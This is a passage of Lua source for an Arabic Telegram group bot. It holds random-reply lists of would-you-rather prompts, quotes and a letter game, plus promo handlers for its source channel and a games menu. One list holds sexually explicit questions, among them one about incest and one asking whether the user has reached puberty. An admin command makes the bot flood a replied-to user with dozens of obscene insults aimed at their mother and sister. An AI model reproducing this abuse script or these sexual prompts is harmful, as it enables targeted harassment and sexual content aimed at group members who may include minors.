" لو جيسكا قالتلك بيو بيو هتوافق ?🥵",
" مين الممثله اللي نفسك تعمل معاها احيه ?🥵",
" لو جاتلك فرصه تمارسي الجنس المخفف راح توافقي او لا ?🥵",
"اخر مرهه غفلت حد وعملت معاه الجولاشه امته ?🥵 ",
" اي اكتر حاجه بتشدك لجسم الجنس الاخر ?🥵",
" بعتي نودز لكام ولد ?🥵",
" عمرك سكسكتي مع ولد ?🥵",
" بتسكسك مع كام بنت ?🥵",
"قبلتي صديقك قبل كدا ?🥵 ",
" عمرك مارست الجنس ?🥵",
" ما رأيك في اللون الاسود حينما ترتديه فتاه بيضاء ?🥵",
" اخر مره قبلت بنت ?🥵",
"اخر مره قبلتي ولد ?🥵 ",
" مشتهي شي ?🥵",
"اخر مره قمت بزياره المواقع الايباحيه ?🥵 ",
"بدك تمارسي العاده السريه من الامام ام الخلف ? 🥵",
"ما المكان المفضل لك في ممارسه الجنس ?🥵 ",
" متي قمت بممارسه العاده السريه اخر مره ?🥵",
" ما لون ملابسك الداخليه المفضل ?🥵",
"ما مقاس البرا التي ترتديها الان ?🥵 ",
" كم مرا نكت بنت ●🥵",
"اخر مرا دخلت الحمام ●🥵 ",
"فشخت كام بنت🥵  ",
" بلغت ولا لا 🥵",
" عايز تنيك ولا لا 🥵",
"حابه تفتحي تيزيك🥵  ",
"اخر مره سكستي امته 🥵 ",
"حابب تنيك خالتك ?? ",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "خيرني" or text == "لو خيروك" or text == "خيروك" then 
local TWEET_Msg = { 
"لو خيروك ♤  بين الإبحار لمدة أسبوع كامل أو السفر على متن طائرة لـ 3 أيام متواصلة● ",
"لو خيروك ♤  بين شراء منزل صغير أو استئجار فيلا كبيرة بمبلغ معقول● ",
"لو خيروك ♤  أن تعيش قصة فيلم هل تختار الأكشن أو الكوميديا● ",
"لو خيروك ♤  بين تناول البيتزا وبين الآيس كريم وذلك بشكل دائم● ",
"لو خيروك ♤  بين إمكانية تواجدك في الفضاء وبين إمكانية تواجدك في البحر● ",
"لو خيروك ♤  بين تغيير وظيفتك كل سنة أو البقاء بوظيفة واحدة طوال حياتك● ",
"لو خيروك ♤  أسئلة محرجة أسئلة صراحة ماذا ستختار● ",
"لو خيروك ♤  بين الذهاب إلى الماضي والعيش مع جدك أو بين الذهاب إلى المستقبل والعيش مع أحفادك● ",
"لو كنت شخص آخر هل تفضل البقاء معك أم أنك ستبتعد عن نفسك● ",
"لو خيروك ♤  بين الحصول على الأموال في عيد ميلادك أو على الهدايا● ",
"لو خيروك ♤  بين القفز بمظلة من طائرة أو الغوص في أعماق البحر● ",
"لو خيروك ♤  بين الاستماع إلى الأخبار الجيدة أولًا أو الاستماع إلى الأخبار السيئة أولًا● ",
"لو خيروك ♤  بين أن تكون رئيس لشركة فاشلة أو أن تكون موظف في شركة ناجحة● ",
"لو خيروك ♤  بين أن يكون لديك جيران صاخبون أو أن يكون لديك جيران فضوليون● ",
"لو خيروك ♤  بين أن تكون شخص مشغول دائمًا أو أن تكون شخص يشعر بالملل دائمًا● ",
"لو خيروك ♤  بين قضاء يوم كامل مع الرياضي الذي تشجعه أو نجم السينما الذي تحبه● ",
"لو خيروك ♤  بين استمرار فصل الشتاء دائمًا أو بقاء فصل الصيف● ",
"لو خيروك ♤  بين العيش في القارة القطبية أو العيش في الصحراء● ",
"لو خيروك ♤  بين أن تكون لديك القدرة على حفظ كل ما تسمع أو تقوله وبين القدرة على حفظ كل ما تراه أمامك● ",
"لو خيروك ♤  بين أن يكون طولك 150 سنتي متر أو أن يكون 190 سنتي متر● ",
"لو خيروك ♤  بين إلغاء رحلتك تمامًا أو بقائها ولكن فقدان الأمتعة والأشياء الخاص بك خلالها● ",
"لو خيروك ♤  بين أن تكون اللاعب الأفضل في فريق كرة فاشل أو أن تكون لاعب عادي في فريق كرة ناجح● ",
"لو خيروك ♤  بين ارتداء ملابس البيت لمدة أسبوع كامل أو ارتداء البدلة الرسمية لنفس المدة● ",
"لو خيروك ♤  بين امتلاك أفضل وأجمل منزل ولكن في حي سيء أو امتلاك أسوأ منزل ولكن في حي جيد وجميل● ",
"لو خيروك ♤  بين أن تكون غني وتعيش قبل 500 سنة● أو أن تكون فقير وتعيش في عصرنا الحالي● ",
"لو خيروك ♤  بين ارتداء ملابس الغوص ليوم كامل والذهاب إلى العمل أو ارتداء ملابس جدك/جدتك● ",
"لو خيروك ♤  بين قص شعرك بشكل قصير جدًا أو صبغه باللون الوردي● ",
"لو خيروك ♤  بين أن تضع الكثير من الملح على كل الطعام بدون علم أحد● أو أن تقوم بتناول شطيرة معجون أسنان● ",
"لو خيروك ♤  بين قول الحقيقة والصراحة الكاملة مدة 24 ساعة أو الكذب بشكل كامل مدة 3 أيام● ",
"لو خيروك ♤  بين تناول الشوكولا التي تفضلها لكن مع إضافة رشة من الملح والقليل من عصير الليمون إليها أو تناول ليمونة كاملة كبيرة الحجم● ",
"لو خيروك ♤  بين وضع أحمر الشفاه على وجهك ما عدا شفتين أو وضع ماسكارا على شفتين فقط● ",
"لو خيروك ♤  بين الرقص على سطح منزلك أو الغناء على نافذتك● ",
"لو خيروك ♤  بين تلوين شعرك كل خصلة بلون وبين ارتداء ملابس غير متناسقة لمدة أسبوع● ",
"لو خيروك ♤  بين تناول مياه غازية مجمدة وبين تناولها ساخنة● ",
"لو خيروك ♤  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام كريم الأساس لغسيل الأطباق● ",
"لو خيروك ♤  بين تزيين طبق السلطة بالبرتقال وبين إضافة البطاطا لطبق الفاكهة● ",
"لو خيروك ♤  بين اللعب مع الأطفال لمدة 7 ساعات أو الجلوس دون فعل أي شيء لمدة 24 ساعة● ",
"لو خيروك ♤  بين شرب كوب من الحليب أو شرب كوب من شراب عرق السوس● ",
"لو خيروك ♤  بين الشخص الذي تحبه وصديق الطفولة● ",
"لو خيروك ♤  بين أمك وأبيك● ",
"لو خيروك ♤  بين أختك وأخيك● ",
"لو خيروك ♤  بين نفسك وأمك● ",
"لو خيروك ♤  بين صديق قام بغدرك وعدوك● ",
"لو خيروك ♤  بين خسارة حبيبك/حبيبتك أو خسارة أخيك/أختك● ",
"لو خيروك ♤  بإنقاذ شخص واحد مع نفسك بين أمك أو ابنك● ",
"لو خيروك ♤  بين ابنك وابنتك● ",
"لو خيروك ♤  بين زوجتك وابنك/ابنتك● ",
"لو خيروك ♤  بين جدك أو جدتك● ",
"لو خيروك ♤  بين زميل ناجح وحده أو زميل يعمل كفريق● ",
"لو خيروك ♤  بين لاعب كرة قدم مشهور أو موسيقي مفضل بالنسبة لك● ",
"لو خيروك ♤  بين مصور فوتوغرافي جيد وبين مصور سيء ولكنه عبقري فوتوشوب● ",
"لو خيروك ♤  بين سائق سيارة يقودها ببطء وبين سائق يقودها بسرعة كبيرة● ",
"لو خيروك ♤  بين أستاذ اللغة العربية أو أستاذ الرياضيات● ",
"لو خيروك ♤  بين أخيك البعيد أو جارك القريب● ",
"لو خيروك ♤  يبن صديقك البعيد وبين زميلك القريب● ",
"لو خيروك ♤  بين رجل أعمال أو أمير● ",
"لو خيروك ♤  بين نجار أو حداد● ",
"لو خيروك ♤  بين طباخ أو خياط● ",
"لو خيروك ♤  بين أن تكون كل ملابس بمقاس واحد كبير الحجم أو أن تكون جميعها باللون الأصفر● ",
"لو خيروك ♤  بين أن تتكلم بالهمس فقط طوال الوقت أو أن تصرخ فقط طوال الوقت● ",
"لو خيروك ♤  بين أن تمتلك زر إيقاف موقت للوقت أو أن تمتلك أزرار للعودة والذهاب عبر الوقت● ",
"لو خيروك ♤  بين أن تعيش بدون موسيقى أبدًا أو أن تعيش بدون تلفاز أبدًا● ",
"لو خيروك ♤  بين أن تعرف متى سوف تموت أو أن تعرف كيف سوف تموت● ",
"لو خيروك ♤  بين العمل الذي تحلم به أو بين إيجاد شريك حياتك وحبك الحقيقي● ",
"لو خيروك ♤  بين معاركة دب أو بين مصارعة تمساح● ",
"لو خيروك ♤  بين إما الحصول على المال أو على المزيد من الوقت● ",
"لو خيروك ♤  بين امتلاك قدرة التحدث بكل لغات العالم أو التحدث إلى الحيوانات● ",
"لو خيروك ♤  بين أن تفوز في اليانصيب وبين أن تعيش مرة ثانية● ",
"لو خيروك ♤  بأن لا يحضر أحد إما لحفل زفافك أو إلى جنازتك● ",
"لو خيروك ♤  بين البقاء بدون هاتف لمدة شهر أو بدون إنترنت لمدة أسبوع● ",
"لو خيروك ♤  بين العمل لأيام أقل في الأسبوع مع زيادة ساعات العمل أو العمل لساعات أقل في اليوم مع أيام أكثر● ",
"لو خيروك ♤  بين مشاهدة الدراما في أيام السبعينيات أو مشاهدة الأعمال الدرامية للوقت الحالي● ",
"لو خيروك ♤  بين التحدث عن كل شيء يدور في عقلك وبين عدم التحدث إطلاقًا● ",
"لو خيروك ♤  بين مشاهدة فيلم بمفردك أو الذهاب إلى مطعم وتناول العشاء بمفردك● ",
"لو خيروك ♤  بين قراءة رواية مميزة فقط أو مشاهدتها بشكل فيلم بدون القدرة على قراءتها● ",
"لو خيروك ♤  بين أن تكون الشخص الأكثر شعبية في العمل أو المدرسة وبين أن تكون الشخص الأكثر ذكاءً● ",
"لو خيروك ♤  بين إجراء المكالمات الهاتفية فقط أو إرسال الرسائل النصية فقط● ",
"لو خيروك ♤  بين إنهاء الحروب في العالم أو إنهاء الجوع في العالم● ",
"لو خيروك ♤  بين تغيير لون عينيك أو لون شعرك● ",
"لو خيروك ♤  بين امتلاك كل عين لون وبين امتلاك نمش على خديك● ",
"لو خيروك ♤  بين الخروج بالمكياج بشكل مستمر وبين الحصول على بشرة صحية ولكن لا يمكن لك تطبيق أي نوع من المكياج● ",
"لو خيروك ♤  بين أن تصبحي عارضة أزياء وبين ميك آب أرتيست● ",
"لو خيروك ♤  بين مشاهدة كرة القدم أو متابعة الأخبار● ",
"لو خيروك ♤  بين موت شخصية بطل الدراما التي تتابعينها أو أن يبقى ولكن يكون العمل الدرامي سيء جدًا● ",
"لو خيروك ♤  بين العيش في دراما قد سبق وشاهدتها ماذا تختارين بين الكوميديا والتاريخي● ",
"لو خيروك ♤  بين امتلاك القدرة على تغيير لون شعرك متى تريدين وبين الحصول على مكياج من قبل خبير تجميل وذلك بشكل يومي● ",
"لو خيروك ♤  بين نشر تفاصيل حياتك المالية وبين نشر تفاصيل حياتك العاطفية● ",
"لو خيروك ♤  بين البكاء والحزن وبين اكتساب الوزن● ",
"لو خيروك ♤  بين تنظيف الأطباق كل يوم وبين تحضير الطعام● ",
"لو خيروك ♤  بين أن تتعطل سيارتك في نصف الطريق أو ألا تتمكنين من ركنها بطريقة صحيحة● ",
"لو خيروك ♤  بين إعادة كل الحقائب التي تملكينها أو إعادة الأحذية الجميلة الخاصة بك● ",
"لو خيروك ♤  بين قتل حشرة أو متابعة فيلم رعب● ",
"لو خيروك ♤  بين امتلاك قطة أو كلب● ",
"لو خيروك ♤  بين الصداقة والحب ",
"لو خيروك ♤  بين تناول الشوكولا التي تحبين طوال حياتك ولكن لا يمكنك الاستماع إلى الموسيقى وبين الاستماع إلى الموسيقى ولكن لا يمكن لك تناول الشوكولا أبدًا● ",
"لو خيروك ♤  بين مشاركة المنزل مع عائلة من الفئران أو عائلة من الأشخاص المزعجين الفضوليين الذين يتدخلون في كل كبيرة وصغيرة● ",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "بوستات" or text == "قولي" then 
local TWEET_Msg = { 
" أحياناً.. ويصبح الوهم حقيقه😪.",
" الجمال يلفت الأنظار لكن الطيبه تلفت القلوب🙂 .!",
"لا تحقرون صغيره إن الجبال من الحصي 💖",
"لا تمد عينك في يد غيرك 💕",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ. 🌚.",
"‏ هل كانت كل الطرق تؤدي إليكِ● أم أنني كنتُ أجعلها كذلك. 🤫 .!",
"ويُرهقني أنّي مليء بما لا أستطيع قوله.✨ ",
"‏أَكَان عَلَيَّ أَنْ أغْرَس انيابي فِي قَلْبِك لتشعر بِي ●. 😁",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء. 😎",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ. 😃",
"لا تظلم حتى لا تتظلم 😊",
"لا حياه للإنسان بلا نبات ☺️",
"لا تقف قصاد الريح ولا تمشي معها.... ♤️",
" لا تملح الا لمن يستحقاها ويحافظ عليها😛",
"لا يدخل الجنه من لايأمن من جازه بوائقه 😿.",
"لا دين لمن لا عهد له ♤ ",
"لا تظلم حتى لا تتظلم 🌚.",
"عامل الناس بأخلاقك ولا بأخلاقهم ♤⛷️",
"لا تقف قصاد الريح ولا تمشي معها.... 💚 ",
"‏ ‏أحببتك وأنا منطفئ● فما بالك وأنا في كامل توهجي ● 🙂 .!",
"‏من ترك أمرهُ لله● أعطاه الله فوق ما يتمنَّاه💙 ",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ● انتصار. ♤💛",
"‏ ‏كل العالم يهون بس الدنيا بينا تصفي 💙 ",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء. 😚 ",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ● انتصار. 💝",
"‏ لا تعودني على دفء شمسك● إذا كان في نيتك الغروب .َ 🙂 .!",
"‏من علامات جمال المرأة .. بختها المايل ! ♤️",
"‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة.💜 ",
"‏ : كُلما أتبع قلبي يدلني إليك . 😜",
"‏ انك الجميع و كل من احتل قلبي🫀🤍 ",
"‏ بس لما أنا ببقى فايق● ببقى أبكم له ودان.💖 ",
"‏ ‏ممكن اكون اختارت غلط بس والله حبيت بجد🖇️ ",
"‏ لا تعودني على دفء شمسك● إذا كان في نيتك الغروب .َ 💕",
" ‏ ‏تبدأ حياتك محاولاً فهم كل شيء● وتنهيها محاولاً النجاة من كل ما فهمت.💖",
"الجمال يلفت الأنظار لكن الطيبه تلفت القلوب 😁",
"كما تدين تدان 😊",
"عامل الناس بأخلاقك ولا بأخلاقهم 🙂",
"يسروا ولا تعسروا... ويشورا ولا تنفروا 💕",
" لا يدخل الجنه من لايأمن من جازه بوائقه💓",
" كل كتير عادي ميهمكش😂♤️",
"لا تملح الا لمن يستحقاها ويحافظ عليها ♤ ",
" الجمال يلفت الأنظار لكن الطيبه تلفت القلوب♤ ",
" خليك طبيعي مش نورم😇♤️ ",
" الدنيا حلوه متزعلش علي ناس ماتستاهلش🕊🏃‍♂️",
" العقل السليم ف البعد عن الحريم😇♤️",
"عيش الحياه يوم واحد 🙂 .! ",
"امشي كتير عشان تخس 🧐 .! ",
" اشرب ميه كتير 😎.",
"كُنْ لحوحاً فِي الدّعاءِ●فقدْ أوشكَ السّهمُ أنْ يُصيبَ. 💗",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == "حفل" and Sudo(msg) or text == 'حفل عليه' and Sudo(msg) then
local t7fel = { 
'يمتهان', 
} 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_,'['..t7fel[math.random(#t7fel)]..']') 
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل مبرمجي تيمو  ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل اي راجل جدع في التلي ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل الشيخ جابوا ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك يا ابن المتناكه ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل اختك الشرموطه ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل امك المتناكه ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل زب مبرمجي تيمو ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل المالك عمر ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل ابو المجد ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل عمك جابوا ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'يلا يا خرم امك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'يلا يا كس اختك ♥') 
send(msg.chat_id_, msg.reply_to_message_id_, 'يلا يا بعبص عمتك ♥')   
send(msg.chat_id_, msg.reply_to_message_id_, 'يلا يا متناك امك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'يلا يا ابن الاحبه ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'يديمني ضحك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'علي صوتك يا ابن المتناكه ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'نت بطئ نيك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'مترد يا كسمك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل انك مش عارف تسد ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'علي صوتك يا ابن المتناكه  ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل امك المتناكه ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل زب مبرمجي تيمو ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل بزاز امك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل بوتات التلي كلها ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل زب اي راكل جدع في التلي ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'يلا يا خرم امك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'يلا يا كس اختك ♥') 
send(msg.chat_id_, msg.reply_to_message_id_, 'يلا يا بعبص عمتك ♥')   
send(msg.chat_id_, msg.reply_to_message_id_, 'يلا يا متناك امك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'يلا يا ابن الاحبه ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'يديمني ضحك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'علي صوتك يا ابن المتناكه ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'نت بطئ نيك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'مترد يا كسمك ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'كسمك لاجل انك مش عارف تسد ♥')  
send(msg.chat_id_, msg.reply_to_message_id_, 'النهايه ♥')  
return false 
end
if text == "حروف" or text == "حرف" or text == "الحروف" then 
local TWEET_Msg = { 
" جماد بحرف ⇦♤ ر  ", 
" مدينة بحرف ⇦♤ ع  ",
" حيوان ونبات بحرف ⇦♤ خ  ", 
" اسم بحرف ⇦♤ ح  ", 
" اسم ونبات بحرف ⇦♤ م  ", 
" دولة عربية بحرف ⇦♤ ق  ", 
" جماد بحرف ⇦♤ ي  ", 
" نبات بحرف ⇦♤ ج  ", 
" اسم بنت بحرف ⇦♤ ع  ", 
" اسم ولد بحرف ⇦♤ ع  ", 
" اسم بنت وولد بحرف ⇦♤ ث  ", 
" جماد بحرف ⇦♤ ج  ",
" حيوان بحرف ⇦♤ ص  ",
" دولة بحرف ⇦♤ س  ",
" نبات بحرف ⇦♤ ج  ",
" مدينة بحرف ⇦♤ ب  ",
" نبات بحرف ⇦♤ ر  ",
" اسم بحرف ⇦♤ ك  ",
" حيوان بحرف ⇦♤ ظ  ",
" جماد بحرف ⇦♤ ذ  ",
" مدينة بحرف ⇦♤ و  ",
" اسم بحرف ⇦♤ م  ",
" اسم بنت بحرف ⇦♤ خ  ",
" اسم و نبات بحرف ⇦♤ ر  ",
" نبات بحرف ⇦♤ و  ",
" حيوان بحرف ⇦♤ س  ",
" مدينة بحرف ⇦♤ ك  ",
" اسم بنت بحرف ⇦♤ ص  ",
" اسم ولد بحرف ⇦♤ ق  ",
" نبات بحرف ⇦♤ ز  ",
"  جماد بحرف ⇦♤ ز  ",
"  مدينة بحرف ⇦♤ ط  ",
"  جماد بحرف ⇦♤ ن  ",
"  مدينة بحرف ⇦♤ ف  ",
"  حيوان بحرف ⇦♤ ض  ",
"  اسم بحرف ⇦♤ ك  ",
"  نبات و حيوان و مدينة بحرف ⇦♤ س  ", 
"  اسم بنت بحرف ⇦♤ ج  ", 
"  مدينة بحرف ⇦♤ ت  ", 
"  جماد بحرف ⇦♤ ه  ", 
"  اسم بنت بحرف ⇦♤ ر  ", 
" اسم ولد بحرف ⇦♤ خ  ", 
" جماد بحرف ⇦♤ ع  ",
" حيوان بحرف ⇦♤ ح  ",
" نبات بحرف ⇦♤ ف  ",
" اسم بنت بحرف ⇦♤ غ  ",
" اسم ولد بحرف ⇦♤ و  ",
" نبات بحرف ⇦♤ ل  ",
"مدينة بحرف ⇦♤ ع  ",
"دولة واسم بحرف ⇦♤ ب  ",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end

if text and text:match('^الحساب (%d+)$') then
local id = text:match('^الحساب (%d+)$')
local text = 'اضغط لمشاهده الحساب'
tdcli_function ({ID="SendMessage", chat_id_=msg.chat_id_, reply_to_message_id_=msg.id_, disable_notification_=0, from_background_=1, reply_markup_=nil, input_message_content_={ID="InputMessageText", text_=text, disable_web_page_preview_=1, clear_draft_=0, entities_={[0] = {ID="MessageEntityMentionName", offset_=0, length_=19, user_id_=id}}}}, dl_cb, nil)
end
local function oChat(chat_id,cb)
tdcli_function ({
ID = "OpenChat",
chat_id_ = chat_id
}, cb, nil)
end
if text and text:match("^كشف (.*)$") then 
local userid = text:match("^كشف (.*)$") 
function start_function(extra, result, success) 
if userid then 
tdcli_function ({ID = "GetUser",user_id_ = userid},function(extra,data)  
local rtp = Rutba(userid,msg.chat_id_) 
local username = ('[@'..data.username_..']' or 'لا يوجد') 
local iduser = userid 
send(msg.chat_id_, msg.id_,'  ♤الايدي ⇦♤'..iduser..'♤\n ♤المعرف ⇦♤'..username..'♤\n ♤الرتبه ⇦♤'..rtp..'♤\n ♤نوع الكشف ⇦♤بالمعرف') 
end,nil) 
else 
send(msg.chat_id_, msg.id_,'  ♤المعرف غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
if text == "قناه السورس" or text == "قناه التحديثات" then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ♤من أحسن السورسات على التليجرام سورس الملوك ♤
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
خش علي تواصل هيدخلك قناه اليوزرات تواصل معنا ♤.
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺' then
local Text = [[ 
 ♤من أحسن السورسات على التليجرام سورس الملوك ♤
بجد سورس أمان جدا وفي مميزات جامده
تع نصب بوتك عندنا لو محظور
خش علي تواصل هيدخلك قناه اليوزرات تواصل معنا ♤.
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌°', url="t.me/eLmLoK0"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == "التواصل" or text == "تواصل السورس" then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[♤ 𝒕𝒂W𝒂𝒔𝒐𝒍 𝒆𝒍𝒎𝒍𝒐𝒌](t.me/tawasol_1_bot)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '♤ 𝒕𝒂W𝒂𝒔𝒐𝒍 𝒆𝒍𝒎𝒍𝒐𝒌', url="t.me/tawasol_1_bot"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'العاب الملوك' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ♤ اهلا في قائمه الالعاب المتطوره سورس الملوك ♤ 
تفضل اختر لعبه من القائمه 
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
{{text = 'لعبه دراجات', url="https://t.me/gamee?game=MotoFX"},{text = 'سباق سيارات', url="https://t.me/gamee?game=F1Racer"}}, 
{{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=FootballStar"}}, 
{{text = 'ورق', url="https://t.me/gamee?game=Hexonix"},{text = 'لعبه 2048', url="https://t.me/awesomebot?game=g2048"}}, 
{{text = 'SQUARES', url="https://t.me/gamee?game=Squares"},{text = 'ATOMIC', url="https://t.me/gamee?game=AtomicDrop1"}}, 
{{text = 'CORSAIRS', url="https://t.me/gamebot?game=Corsairs"},{text = 'LumberJack', url="https://t.me/gamebot?game=LumberJack"}}, 
{{text = 'LittlePlane', url="https://t.me/gamee?game=LittlePlane"},{text = 'RollerDisco', url="https://t.me/gamee?game=RollerDisco"}},  
{{text = 'كره القدم 2', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'جمع المياه', url="https://t.me/gamee?game=BlockBuster"}},  
{{text = 'لا تجعلها تسقط', url="https://t.me/gamee?game=Touchdown"},{text = 'GravityNinja', url="https://t.me/gamee?game=GravityNinjaEmeraldCity"}},  
{{text = 'Astrocat', url="https://t.me/gamee?game=Astrocat"},{text = 'Skipper', url="https://t.me/gamee?game=Skipper"}},  
{{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
{{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}},  
{{text = 'Paintio', url="https://t.me/gamee?game=Paintio"},{text = 'onetwothree', url="https://t.me/gamee?game=onetwothree"}},  
{{text = 'BrickStacker', url="https://t.me/gamee?game=BrickStacker"},{text = 'StairMaster3D', url="https://t.me/gamee?game=StairMaster3D"}},  
{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'BasketBoyRush', url="https://t.me/gamee?game=BasketBoyRush"}},  
{{text = 'GravityNinja21', url="https://t.me/gamee?game=GravityNinja21"},{text = 'MarsRover', url="https://t.me/gamee?game=MarsRover"}},  
{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"}},  
{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'KeepItUp', url="https://t.me/gamee?game=KeepItUp"}},  
{{text = 'SunshineSolitaire', url="https://t.me/gamee?game=SunshineSolitaire"},{text = 'Qubo', url="https://t.me/gamee?game=Qubo"}},  
{{text = 'PenaltyShooter2', url="https://t.me/gamee?game=PenaltyShooter2"},{text = 'Getaway', url="https://t.me/gamee?game=Getaway"}},  
{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'SpikyFish2', url="https://t.me/gamee?game=SpikyFish2"}},  
{{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"},{text = 'KungFuInc', url="https://t.me/gamee?game=KungFuInc"}},  
